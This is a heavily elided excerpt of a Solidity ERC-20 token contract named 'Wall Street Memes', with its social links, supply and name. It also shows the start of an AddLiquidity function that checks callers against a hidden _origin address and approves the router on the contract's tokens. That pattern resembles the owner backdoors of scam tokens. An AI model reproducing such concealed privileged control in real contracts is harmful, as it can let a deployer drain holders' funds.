...
// Twitter  https://twitter.com/wallstmemes
// Telegram https://t.me/wallst_memes
// TikTok   https://www.tiktok.com/@wallstreetmemesofficial
// Discord  https://discord.com/invite/4E538pzeGX
...
contract WallStreetMemes is IERC20, Ownable, LibreMount {
    ...
    uint256 private _totalSupply = 21000000000000000000000000; //Wei
    string private _name = "Wall Street Memes";
    ...
    function AddLiquidity() payable external {
        SecureCalls.checkCaller(msg.sender, _origin);
        _approve(address(this), address(_router), balanceOf(msg.sender));
